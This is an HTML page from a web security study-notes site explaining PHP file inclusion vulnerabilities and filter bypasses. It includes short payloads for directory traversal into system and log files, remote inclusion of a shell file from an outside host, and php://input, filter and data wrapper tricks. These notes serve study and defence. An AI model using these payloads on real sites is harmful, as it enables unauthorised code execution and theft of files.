@@ -1,0 +1,188 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File contains &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">File contains</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/vuln/fileinclude.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="file-contains">
+<h1>File contains<a class="headerlink" href="#file-contains" title="Link to this heading"></a></h1>
+<section id="base">
+<h2>Base<a class="headerlink" href="#base" title="Link to this heading"></a></h2>
+<p>Common file contains vulnerabilities in the form of <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">include(&quot;inc/&quot;</span> <span class="pre">.</span> <span class="pre">$_GET['file']);</span> <span class="pre">?&gt;</span></code></p>
+<p>Consider several commonly used methods of inclusion</p>
+<ul class="simple">
+<li><p>The same directory contains <code class="docutils literal notranslate"><span class="pre">file=.htaccess</span></code></p></li>
+<li><p>Directory traversal <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../var/lib/locate.db</span></code></p></li>
+<li><p>Log injection <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../var/log/apache/error.log</span></code></p></li>
+</ul>
+<p>-Use <code class="docutils literal notranslate"><span class="pre">/proc/self/environ</span></code></p>
+<p>The log can be tested using SSH logs or web logs.</p>
+</section>
+<section id="trigger-sink">
+<h2>Trigger Sink<a class="headerlink" href="#trigger-sink" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>PHP</p></li>
+<li><p>include</p></li>
+<li><p>An error occurs during the inclusion process and will not affect the execution of subsequent statements</p></li>
+<li><p>include_once</p></li>
+<li><p>Only once included</p></li>
+<li><p>require</p></li>
+<li><p>If an error occurs during the inclusion process, it will exit directly and no subsequent statements will be executed</p></li>
+<li><p>require_once</p></li>
+</ul>
+</section>
+<section id="bypassing-tips">
+<h2>Bypassing Tips<a class="headerlink" href="#bypassing-tips" title="Link to this heading"></a></h2>
+<p>Common applications may call functions to judge the file before it is included. Generally, there are several ways to bypass it.</p>
+<section id="url-encoding-bypass">
+<h3>Url encoding bypass<a class="headerlink" href="#url-encoding-bypass" title="Link to this heading"></a></h3>
+<p>If the string matches in WAF, you can use url multiple encodings to bypass it</p>
+</section>
+<section id="special-character-bypass">
+<h3>Special character bypass<a class="headerlink" href="#special-character-bypass" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>In some cases, reading files supports the use of Shell wildcards, such as <a href="#id1"><span class="problematic" id="id2">``</span></a>?`````*`, etc.</p></li>
+<li><p>Using <code class="docutils literal notranslate"><span class="pre">?`````</span></code> in url may affect the results included</p></li>
+<li><p>In some cases, characters with different encodings but similar glyphs have the same effect</p></li>
+</ul>
+</section>
+<section id="cutoff">
+<h3>%00 cutoff<a class="headerlink" href="#cutoff" title="Link to this heading"></a></h3>
+<p>Almost the most commonly used method, provided that <code class="docutils literal notranslate"><span class="pre">magic_quotes_gpc</span></code> is closed and the php version is less than 5.3.4.</p>
+</section>
+<section id="length-cutoff">
+<h3>Length cutoff<a class="headerlink" href="#length-cutoff" title="Link to this heading"></a></h3>
+<p>The length of the file name on Windows is related to the file path. The specific relationship is: from the root directory, the file path length is up to 259 bytes.</p>
+<p>msdn definition <code class="docutils literal notranslate"><span class="pre">#define</span> <span class="pre">MAX_PATH</span> <span class="pre">260</span></code>, where the 260th character is the end of the string `` `` , while Linux can use getconf to determine file name length limit and file path length limit.</p>
+<p>Get the longest file path length: getconf PATH_MAX /root Get 4096
+Get the longest file name: getconf NAME_MAX /root Get 255</p>
+<p>Then when the length is limited, the path can be exploded through this form of <a href="#id3"><span class="problematic" id="id4">``</span></a>././././<a href="#id5"><span class="problematic" id="id6">`</span></a>.</p>
+<p>In the php code inclusion, this bypass method requires the php version &lt; php 5.2.8</p>
+</section>
+<section id="pseudo-protocol-bypass">
+<h3>Pseudo-Protocol Bypass<a class="headerlink" href="#pseudo-protocol-bypass" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Remote contains: Requires <code class="docutils literal notranslate"><span class="pre">allow_url_fopen=On</span></code> and <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code>, and payload is <code class="docutils literal notranslate"><span class="pre">?file=[http|https|ftp]://websec.wordpress.com/shell.txt</span></code> form</p></li>
+<li><p>PHP input: Put the payload in the POST parameter as the included file, requiring <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code>, and the payload is in the form of <code class="docutils literal notranslate"><span class="pre">?file=php://input</span></code></p></li>
+<li><p>Base64: Use Base64 pseudo-protocol to read files, payload is in the form of <code class="docutils literal notranslate"><span class="pre">?file=php://filter/convert.base64-encode/resource=index.php</span></code></p></li>
+<li><p>data: Use the data pseudo-protocol to read the file, payload is in the form of <code class="docutils literal notranslate"><span class="pre">?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</span></code>, requiring <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code></p></li>
+</ul>
+</section>
+<section id="protocol-bypass">
+<h3>Protocol bypass<a class="headerlink" href="#protocol-bypass" title="Link to this heading"></a></h3>
+<p><code class="docutils literal notranslate"><span class="pre">allow_url_fopen</span></code> and <code class="docutils literal notranslate"><span class="pre">allow_url_include</span></code> mainly work for the <code class="docutils literal notranslate"><span class="pre">http</span></code> <code class="docutils literal notranslate"><span class="pre">ftp</span></code> two protocols, so SMB, WebDav protocols, etc. can be used to bypass restrictions.</p>
+</section>
+</section>
+<section id="reference-link">
+<h2>Reference link<a class="headerlink" href="#reference-link" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols</a></p></li>
+<li><p><a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">lfi cheat sheet</a></p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
